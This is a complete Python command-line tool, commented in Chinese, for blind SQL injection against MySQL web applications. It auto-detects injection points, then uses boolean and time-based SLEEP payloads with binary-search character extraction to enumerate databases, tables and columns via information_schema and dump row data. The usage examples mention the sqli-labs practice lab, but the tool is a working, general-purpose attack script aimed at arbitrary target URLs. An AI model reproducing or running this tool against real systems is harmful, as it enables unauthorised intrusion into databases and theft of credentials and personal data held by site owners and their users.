#!/usr/bin/env python3
import requests
import time
import json
import argparse
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

# ═══════════════════════════════════════════════════════════════
# 字符集
# ═══════════════════════════════════════════════════════════════
# 全可打印 ASCII (32-126)，按码值排序 — 覆盖密码/哈希/邮箱等所有可见字符
CHARSET = list(range(32, 127))

# 默认 HTTP 头
DEFAULT_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                  "AppleWebKit/537.36 (KHTML, like Gecko) "
                  "Chrome/120.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
}


# ═══════════════════════════════════════════════════════════════
# SQLInjector 核心类
# ═══════════════════════════════════════════════════════════════
class SQLInjector:
    """SQL 盲注引擎 — 布尔 / 时间双模式，二分法爆破，并发加速"""

    def __init__(self, url, data_template, method="POST",
                 technique="B", prefix="'", suffix="-- ",
                 flag=None, time_sec=2, max_len=30,
                 cookie=None, proxy=None, threads=1,
                 output_dir="data", verbose=False):
        # ---- 目标配置 ----
        self.url = url
        self.data_template = data_template or ""  # 含 * 的模板（可为空，此时 * 在 URL 中）
        self.method = method.upper()
        self.technique = technique.upper()   # B / T / BT
        self.prefix = prefix                # 注入前缀（闭合引号等）
        self.suffix = suffix                # 注入后缀（注释符等）
        self.flag = flag                    # 布尔盲注的成功标志字符串
        self.time_sec = time_sec            # 时间盲注延时阈值
        self.max_len = max_len
        self.cookie = cookie
        self.proxy = proxy
        self.threads = threads
        self.output_dir = Path(output_dir)
        self.verbose = verbose
        self.charset = CHARSET

        # ---- 运行时状态 ----
        self.session = requests.Session()
        self.session.headers.update(DEFAULT_HEADERS)
        if cookie:
            self.session.headers["Cookie"] = cookie
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}

        self.progress = {}          # 断点续传数据
        self.progress_file = self.output_dir / "sqli_progress.json"

        # 布尔盲注基准（无 flag 时自动校准）
        self._baseline_true_len = None
        self._baseline_false_len = None
        self._bool_usable = True  # 校准失败时置 False，自动降级到时间盲注

        # 时间盲注连接词：检测阶段自动判定用 AND 还是 OR
        # 当注入点前面的条件恒为 False 时必须用 OR（如 Less-16 username=("")）
        self.time_conjunction = "AND"

        # ---- 日志 ----
        self.logger = logging.getLogger("SQLi")
        handler = logging.StreamHandler()
        handler.setFormatter(logging.Formatter(
            "[%(asctime)s] %(levelname)s - %(message)s",
            datefmt="%H:%M:%S"
        ))
        self.logger.addHandler(handler)
        self.logger.setLevel(logging.DEBUG if verbose else logging.INFO)

        self.output_dir.mkdir(parents=True, exist_ok=True)

    # ═══════════════════════════════════════════
    # 请求构造
    # ═══════════════════════════════════════════
    def _build_payload(self, condition):
        """将 * 替换为 prefix + condition + suffix（同时处理 URL 和 data）"""
        return self.prefix + condition + self.suffix

    def _parse_data(self, data_str):
        """解析 data 字符串为 dict，支持 key=*（值含注入点）"""
        result = {}
        for pair in data_str.split("&"):
            if "=" not in pair:
                continue
            key, val = pair.split("=", 1)
            result[key.strip()] = val.strip()
        return result

    def _send(self, condition):
        """发送请求，自动处理 URL 和 data 中的 * 占位符"""
        payload = self._build_payload(condition)
        data_str = self.data_template.replace("*", payload)

        # URL 里的 * 替换为 payload，GET 模式下 # 需编码为 %23
        # 否则 # 被当作 URL 锚点，后续内容不发送到服务器
        url_payload = payload.replace("#", "%23") if self.method == "GET" else payload
        url = self.url.replace("*", url_payload)

        params = self._parse_data(data_str)

        if self.method == "GET":
            resp = self.session.get(url, params=params, timeout=30)
        else:
            resp = self.session.post(url, data=params, timeout=30)

        return resp

    # ═══════════════════════════════════════════
    # 探测方法
    # ═══════════════════════════════════════════
    def _send_timed(self, condition):
        """发送请求并计时"""
        start = time.perf_counter()
        try:
            _ = self._send(condition)
            elapsed = time.perf_counter() - start
            return elapsed
        except Exception as e:
            self.logger.debug(f"请求异常: {e}")
            return float("inf")

    def check_bool(self, condition):
        """
        布尔盲注探测：
        - 有 flag → 检查 flag 是否出现在响应中
        - 无 flag → 自动发送 1=1 / 1=2 建立真/假基准长度，后续按长度判断
        - 校准失败时返回 False，由 check() 自动降级到时间盲注
        """
        if not self._bool_usable:
            return False
        try:
            resp = self._send(condition)
            if self.flag:
                return self.flag in resp.text

            # 无 flag：自动校准基准
            if self._baseline_true_len is None:
                self._calibrate_bool()

            if self._baseline_true_len is None:
                return False

            resp_len = len(resp.text)
            diff_true = abs(resp_len - self._baseline_true_len)
            diff_false = abs(resp_len - self._baseline_false_len)
            return diff_true <= diff_false
        except Exception:
            return False

    def _calibrate_bool(self):
        """发送 1=1 和 1=2 确定真/假对应的响应长度；差异过小则标记布尔不可用"""
        try:
            r_true = self._send(" AND 1=1 ")
            r_false = self._send(" AND 1=2 ")
            t_len = len(r_true.text)
            f_len = len(r_false.text)
            diff = abs(t_len - f_len)
            if diff > 10:
                self._baseline_true_len = t_len
                self._baseline_false_len = f_len
                self.logger.info(
                    f"  🎯 布尔基准已校准: 真={t_len}, 假={f_len} (差异={diff})"
                )
            else:
                self._bool_usable = False
                self.logger.warning(
                    f"  ⚠️  真/假响应无差异 (diff={diff})，布尔盲注不可用，"
                    f"自动降级为时间盲注"
                )
        except Exception as e:
            self._bool_usable = False
            self.logger.warning(f"  ⚠️  布尔基准校准失败: {e}，自动降级为时间盲注")

    def check_time(self, condition):
        """
        时间盲注探测：
        把布尔条件包装为 IF(condition, SLEEP(time_sec), 0)，
        如果响应时间 >= time_sec，判定条件为真
        """
        # condition 格式: " AND ascii(substr(...))=65 "
        inner = condition.strip()
        if inner.upper().startswith("AND "):
            inner = inner[4:]
        wrapped = f" {self.time_conjunction} IF({inner}, SLEEP({self.time_sec}), 0) "
        elapsed = self._send_timed(wrapped)
        result = elapsed >= self.time_sec
        if self.verbose:
            self.logger.debug(f"  延时 {elapsed:.2f}s → {'真' if result else '假'}")
        return result

    def check(self, condition):
        """根据 technique 分发探测；布尔不可用时自动降级到时间盲注"""
        if self.technique in ("B", "BT"):
            result = self.check_bool(condition)
            if self._bool_usable:
                return result
            # 布尔不可用，自动降级
            if self.technique == "B":
                self.logger.info("  🔄 已自动切换为时间盲注模式")
                self.technique = "T"
        # 时间盲注
        return self.check_time(condition)

    # ═══════════════════════════════════════════
    # 自动检测注入点
    # ═══════════════════════════════════════════
    def detect(self):
        """
        自动检测注入点是否存在及注入类型
        GET/POST 都试，布尔+时间都测
        """
        self.logger.info("=" * 55)
        self.logger.info("  🔍 自动检测注入点...")
        self.logger.info("=" * 55)

        # 闭合方式测试矩阵（前缀, 后缀, 描述）
        closures = [
            # 单引号系列
            ("'",   "-- ",  "单引号 --"),
            ("'",   "#",    "单引号 #"),
            ("')",  "-- ",  "单引号+括号 --"),
            ("')",  "#",    "单引号+括号 #"),
            ("'))", "-- ",  "单引号+双括号 --"),
            ("'))", "#",    "单引号+双括号 #"),
            # 双引号系列
            ('"',   "-- ",  "双引号 --"),
            ('"',   "#",    "双引号 #"),
            ('")',  "-- ",  "双引号+括号 --"),
            ('")',  "#",    "双引号+括号 #"),
            ('"))', "-- ",  "双引号+双括号 --"),
            ('"))', "#",    "双引号+双括号 #"),
            # 数字型
            ("",    "-- ",  "数字型 --"),
            ("",    "#",    "数字型 #"),
        ]

        # 探测语句模板
        true_cond = " OR 1=1 "
        false_cond = " AND 1=2 "

        saved_method = self.method
        results = []

        for method in ("GET", "POST"):
            self.method = method
            self.logger.info(f"  [{method}] 正在探测...")

            for prefix, suffix, desc in closures:
                saved_prefix, saved_suffix = self.prefix, self.suffix
                self.prefix, self.suffix = prefix, suffix

                # 布尔检测
                try:
                    resp_true = self._send(true_cond)
                    len_true = len(resp_true.text)
                    resp_false = self._send(false_cond)
                    len_false = len(resp_false.text)
                    diff = abs(len_true - len_false)

                    if diff > 50:
                        results.append({
                            "prefix": prefix, "suffix": suffix,
                            "desc": desc, "method": method,
                            "type": "布尔盲注",
                            "confidence": "高" if diff > 500 else "中",
                            "diff": diff,
                        })
                except Exception:
                    pass

                # 时间检测：分别测试 AND 和 OR 连接词
                # 用 IF(1=1, SLEEP, 0) 而非 (SELECT SLEEP) — 后者作为子查询
                # 会被 MySQL 优化器预求值，绕过短路逻辑，导致 AND/OR 都显示延时
                for conj in ("AND", "OR"):
                    sleep_cond = f" {conj} IF(1=1, SLEEP({self.time_sec}), 0) "
                    elapsed = self._send_timed(sleep_cond)
                    if elapsed >= self.time_sec:
                        results.append({
                            "prefix": prefix, "suffix": suffix,
                            "desc": desc, "method": method,
                            "type": "时间盲注",
                            "confidence": "高",
                            "diff": f"延时 {elapsed:.1f}s ({conj})",
                            "time_conjunction": conj,
                        })

                self.prefix, self.suffix = saved_prefix, saved_suffix

        self.method = saved_method

        # 输出结果
        if results:
            self.logger.info(f"  ✅ 发现 {len(results)} 个潜在注入点:")
            for r in results:
                self.logger.info(
                    f"     [{r['type']}][{r.get('method','?')}] {r['desc']} "
                    f"前缀='{r['prefix']}' 后缀='{r['suffix']}' "
                    f"置信度={r['confidence']} (差异={r['diff']})"
                )
            # 布尔盲注优先，同类型选差异最大的
            best = min(results,
                       key=lambda r: (0 if r["type"] == "布尔盲注" else 1,
                                      -(r.get("diff", 0) if isinstance(r.get("diff"), int) else 0)))
            self.prefix = best["prefix"]
            self.suffix = best["suffix"]
            self.method = best.get("method", self.method)
            # 自动选用对应的技术和连接词
            if best["type"] == "时间盲注":
                self.technique = "T"
                self.time_conjunction = best.get("time_conjunction", "OR")
            self.logger.info(f"  🎯 自动选用: [{self.method}] {best['desc']} ({best['type']})")
        else:
            self.logger.warning("  ❌ 未检测到注入点，请手动指定 --prefix 和 --suffix")

        return results

    # ═══════════════════════════════════════════
    # 二分法逐字符爆破
    # ═══════════════════════════════════════════
    def binary_search_char(self, condition_eq, condition_gt, pos):
        """
        二分查找位置 pos 的字符
        condition_eq: ascii(substr(...),{pos},1)={char}  模板
        condition_gt: ascii(substr(...),{pos},1)>{char}  模板
        """
        lo, hi = 0, len(self.charset)
        while lo < hi:
            mid = (lo + hi) // 2
            ascii_val = self.charset[mid]

            eq_cond = condition_eq.format(pos=pos, char=ascii_val)
            if self.check(eq_cond):
                return chr(ascii_val)

            gt_cond = condition_gt.format(pos=pos, char=ascii_val)
            if self.check(gt_cond):
                lo = mid + 1
            else:
                hi = mid

        return ""

    def get_name(self, condition_eq, condition_gt, label, progress_key):
        """
        爆破一个名称（数据库名/表名/字段名）
        condition_eq/gt: 含 {pos} 和 {char} 占位符的条件模板
        label: 日志标签
        progress_key: 断点续传 key
        """
        # 断点续传
        if self.progress.get(progress_key):
            self.logger.info(f"  ⏭️  [{label}] 已缓存: {self.progress[progress_key]}")
            return self.progress[progress_key]

        name = ""
        for pos in range(1, self.max_len + 1):
            ch = self.binary_search_char(condition_eq, condition_gt, pos)
            if not ch:
                break
            name += ch
            self.logger.debug(f"  [{label}] 第{pos}个字符: {ch} → {name}")

        if name:
            self.logger.info(f"  ✅ [{label}] {name}")
            self._save_progress(progress_key, name)
        else:
            self.logger.debug(f"  ⬆️  [{label}] 已到末尾，停止探测")

        return name

    # ═══════════════════════════════════════════
    # 并发爆破辅助
    # ═══════════════════════════════════════════
    def _get_names_concurrent(self, make_templates, max_count, label_fmt, progress_fmt):
        """
        并发爆破多个名称（表名/字段名/数据行）
        make_templates(i) → (condition_eq, condition_gt)
        当 threads > 1 时使用线程池并行获取各索引
        """
        if self.threads <= 1:
            # 单线程：顺序执行，遇空提前终止
            names = []
            for i in range(max_count):
                eq, gt = make_templates(i)
                name = self.get_name(eq, gt, label_fmt(i), progress_fmt(i))
                if not name:
                    break
                names.append(name)
            return names

        # 多线程：并发获取所有索引，之后收集结果
        def fetch_one(i):
            eq, gt = make_templates(i)
            return i, self.get_name(eq, gt, label_fmt(i), progress_fmt(i))

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(fetch_one, i): i for i in range(max_count)}
            results = {}
            for future in as_completed(futures):
                i, name = future.result()
                results[i] = name

        # 按索引排序，连续收集直到遇到第一个空
        names = []
        for i in range(max_count):
            name = results.get(i)
            if not name:
                break
            names.append(name)
        return names

    # ═══════════════════════════════════════════
    # 数据库操作
    # ═══════════════════════════════════════════
    def get_database(self):
        """爆破当前数据库名"""
        self.logger.info("-" * 45)
        self.logger.info("  爆破当前数据库 (database())")
        self.logger.info("-" * 45)

        eq = " AND ascii(substr(database(),{pos},1))={char} "
        gt = " AND ascii(substr(database(),{pos},1))>{char} "
        return self.get_name(eq, gt, "数据库", "__database__")

    def get_databases(self):
        """爆破所有数据库名（并发）"""
        self.logger.info("-" * 45)
        self.logger.info("  爆破所有数据库 (information_schema.schemata)")
        self.logger.info("-" * 45)

        databases = []
        for i in range(self.max_len):
            eq = (f" AND ascii(substr((SELECT schema_name FROM"
                  f" information_schema.schemata LIMIT {i},1),{{pos}},1))={{char}} ")
            gt = (f" AND ascii(substr((SELECT schema_name FROM"
                  f" information_schema.schemata LIMIT {i},1),{{pos}},1))>{{char}} ")

            name = self.get_name(eq, gt, f"数据库 #{i+1}", f"__db_{i}__")
            if not name:
                break
            databases.append(name)

        return databases

    def get_tables(self, database):
        """爆破表名列表（并发）"""
        self.logger.info("-" * 45)
        self.logger.info(f"  爆破表名 (database={database})")
        self.logger.info("-" * 45)

        def make_templates(i):
            base = (f"information_schema.tables"
                    f" WHERE table_schema='{database}' LIMIT {i},1")
            eq = f" AND ascii(substr((SELECT table_name FROM {base}),{{pos}},1))={{char}} "
            gt = f" AND ascii(substr((SELECT table_name FROM {base}),{{pos}},1))>{{char}} "
            return eq, gt

        return self._get_names_concurrent(
            make_templates, self.max_len,
            lambda i: f"表 #{i+1}",
            lambda i: f"__table_{database}_{i}__",
        )

    def get_columns(self, database, table):
        """爆破字段名列表（并发）"""
        self.logger.info("-" * 45)
        self.logger.info(f"  爆破字段名 (database={database}, table={table})")
        self.logger.info("-" * 45)

        def make_templates(i):
            base = (f"information_schema.columns"
                    f" WHERE table_schema='{database}' AND table_name='{table}'"
                    f" LIMIT {i},1")
            eq = f" AND ascii(substr((SELECT column_name FROM {base}),{{pos}},1))={{char}} "
            gt = f" AND ascii(substr((SELECT column_name FROM {base}),{{pos}},1))>{{char}} "
            return eq, gt

        return self._get_names_concurrent(
            make_templates, self.max_len,
            lambda i: f"字段 #{i+1}",
            lambda i: f"__col_{database}_{table}_{i}__",
        )

    def get_data(self, database, table, column, rows=3):
        """爆破指定列的数据（并发）"""
        self.logger.info("-" * 45)
        self.logger.info(f"  爆破数据 ({database}.{table}.{column})")
        self.logger.info("-" * 45)

        def make_templates(i):
            eq = (f" AND ascii(substr((SELECT {column} FROM"
                  f" {database}.{table} LIMIT {i},1),{{pos}},1))={{char}} ")
            gt = (f" AND ascii(substr((SELECT {column} FROM"
                  f" {database}.{table} LIMIT {i},1),{{pos}},1))>{{char}} ")
            return eq, gt

        return self._get_names_concurrent(
            make_templates, rows,
            lambda i: f"行 #{i+1}",
            lambda i: f"__data_{database}_{table}_{column}_{i}__",
        )

    # ═══════════════════════════════════════════
    # 断点续传
    # ═══════════════════════════════════════════
    def load_progress(self):
        """加载进度文件"""
        if self.progress_file.exists():
            try:
                with open(self.progress_file, "r", encoding="utf-8") as f:
                    self.progress = json.load(f)
                self.logger.info(f"📂 已加载进度: {len(self.progress)} 项已缓存")
            except Exception:
                self.progress = {}

    def _save_progress(self, key, value):
        """保存单项进度到文件"""
        self.progress[key] = value
        try:
            with open(self.progress_file, "w", encoding="utf-8") as f:
                json.dump(self.progress, f, ensure_ascii=False, indent=2)
        except Exception:
            pass

    def save_results(self, database, tables, columns_data, data_results):
        """导出完整结果到 JSON"""
        result = {
            "url": self.url,
            "method": self.method,
            "technique": self.technique,
            "database": database,
            "tables": {},
        }
        for db, tbls in tables.items():
            result["tables"][db] = {}
            for tbl in tbls:
                result["tables"][db][tbl] = {
                    "columns": columns_data.get(f"{db}.{tbl}", []),
                    "data": data_results.get(f"{db}.{tbl}", {}),
                }

        out_path = self.output_dir / "sqli_results.json"
        with open(out_path, "w", encoding="utf-8") as f:
            json.dump(result, f, ensure_ascii=False, indent=2)
        self.logger.info(f"📄 结果已保存: {out_path}")


# ═══════════════════════════════════════════════════════════════
# 命令行接口
# ═══════════════════════════════════════════════════════════════
def parse_args():
    parser = argparse.ArgumentParser(
        description="SQL 盲注工具 — 布尔盲注 / 时间盲注（MySQL）",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例:
  # 布尔盲注（POST）
  python sql盲注.py -u http://127.0.0.1/sqli-labs-master/Less-16/ \\
      --data "uname=*&passwd=1&submit=Submit" -t B

  # 时间盲注（GET）+ 4线程并发
  python sql盲注.py -u http://target.com/page.php \\
      --data "id=*" --method GET -t T --threads 4

  # 自定义注入前后缀
  python sql盲注.py -u http://target.com/login.php \\
      --data "user=*&pass=1" --prefix "admin')" --suffix "#"

  # 自动检测 + 断点续传
  python sql盲注.py -u http://target.com/ --data "q=*" --auto --resume
        """,
    )
    # 必填
    parser.add_argument("-u", "--url", required=True,
                        help="目标 URL")
    parser.add_argument("--data", default=None,
                        help="请求 body/query，用 * 标记注入点。GET 且 URL 含 * 时可省略")

    # 请求配置
    parser.add_argument("--method", default="POST", choices=["GET", "POST"],
                        help="请求方式 (default: POST)")
    parser.add_argument("--cookie", default=None,
                        help="Cookie 字符串")

    # 注入配置
    parser.add_argument("-t", "--technique", default="B",
                        choices=["B", "T", "BT"],
                        help="B=布尔盲注 T=时间盲注 BT=组合 (default: B)")
    parser.add_argument("--prefix", default="'",
                        help="注入前缀，用于闭合引号等 (default: ')")
    parser.add_argument("--suffix", default="-- ",
                        help="注入后缀，用于注释剩余 SQL (default: '-- ')")
    parser.add_argument("--flag", default=None,
                        help="布尔盲注成功标志字符串（响应中独有的字符串）")
    parser.add_argument("--time-sec", type=float, default=2.0,
                        help="时间盲注的 SLEEP 秒数 (default: 2)")

    # 爆破配置
    parser.add_argument("--max-len", type=int, default=30,
                        help="名称最大长度 (default: 30)")
    parser.add_argument("--threads", type=int, default=1,
                        help="并发线程数 (default: 1)")
    parser.add_argument("--rows", type=int, default=3,
                        help="每列获取的数据行数 (default: 3)")

    # 其他
    parser.add_argument("--proxy", default=None,
                        help="代理地址，如 http://127.0.0.1:10809")
    parser.add_argument("--output", default="data",
                        help="结果输出目录 (default: data)")
    parser.add_argument("--resume", action="store_true",
                        help="从上次中断继续")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="详细日志输出")

    return parser.parse_args()


def main():
    args = parse_args()

    # 创建注入器
    inj = SQLInjector(
        url=args.url,
        data_template=args.data,
        method=args.method,
        technique=args.technique,
        prefix=args.prefix,
        suffix=args.suffix,
        flag=args.flag,
        time_sec=args.time_sec,
        max_len=args.max_len,
        cookie=args.cookie,
        proxy=args.proxy,
        threads=args.threads,
        output_dir=args.output,
        verbose=args.verbose,
    )

    # 断点续传
    if args.resume:
        inj.load_progress()

    # 始终自动检测注入点（会覆盖 --prefix/--suffix/--method/--technique）
    results = inj.detect()
    if not results:
        inj.logger.warning("自动检测未发现注入点，使用手动指定的前后缀继续...")

    # 开始爆破
    print()
    inj.logger.info("╔" + "═" * 53 + "╗")
    inj.logger.info("║  SQL 盲注工具 — MySQL 布尔/时间盲注                      ║")
    inj.logger.info("╠" + "═" * 53 + "╣")
    inj.logger.info(f"║  URL:      {args.url:<42s} ║")
    inj.logger.info(f"║  Method:   {inj.method:<42s} ║")
    inj.logger.info(f"║  技术:     {'布尔' if inj.technique in ('B','BT') else ''}"
                    f"{' + ' if inj.technique == 'BT' else ''}"
                    f"{'时间' if inj.technique in ('T','BT') else ''}"
                    f"{' ' * (35 - len(inj.technique))} ║")
    inj.logger.info(f"║  前缀:     '{inj.prefix}'{' ' * (37 - len(str(inj.prefix)))} ║")
    inj.logger.info(f"║  后缀:     '{inj.suffix}'{' ' * (37 - len(str(inj.suffix)))} ║")
    inj.logger.info("╚" + "═" * 53 + "╝")
    print()

    # Step 1: 爆破当前数据库
    database = inj.get_database()
    if not database:
        inj.logger.error("无法获取数据库名，退出。")
        return

    # Step 2: 选择数据库
    print()
    choice = input(f"当前数据库: {database}\n"
                   f"输入 y 使用当前数据库，或输入其他数据库名: ").strip()
    if choice and choice.lower() != "y":
        database = choice

    # Step 3: 爆破表名
    tables = inj.get_tables(database)
    if not tables:
        inj.logger.error("未找到任何表，退出。")
        return

    print(f"\n表名: {tables}")

    # Step 4: 爆破字段和数据
    all_columns = {}
    all_data = {}

    while True:
        table = input("\n请输入要爆破的表名 (输入 q 退出): ").strip()
        if table.lower() == "q":
            break
        if table not in tables:
            inj.logger.warning(f"表 '{table}' 不在已知列表中: {tables}")
            confirm = input("继续爆破? (y/n): ").strip()
            if confirm.lower() != "y":
                continue

        columns = inj.get_columns(database, table)
        all_columns[f"{database}.{table}"] = columns
        print(f"\n字段名: {columns}")

        if not columns:
            continue

        column_str = input("请输入要拖取的字段 (空格分隔，回车=全部): ").strip()
        target_cols = column_str.split() if column_str else columns

        for col in target_cols:
            if col not in columns and column_str:
                inj.logger.warning(f"字段 '{col}' 不在已知列表中，跳过。")
                continue
            data = inj.get_data(database, table, col, rows=args.rows)
            all_data.setdefault(f"{database}.{table}", {})[col] = data
            print(f"  {col}: {data}")

        another = input("\n继续爆破其他表? (y/n): ").strip()
        if another.lower() != "y":
            break

    # Step 5: 导出结果
    tables_dict = {database: tables}
    inj.save_results(database, tables_dict, all_columns, all_data)
    inj.logger.info("✅ 爆破完成！")


if __name__ == "__main__":
    main()
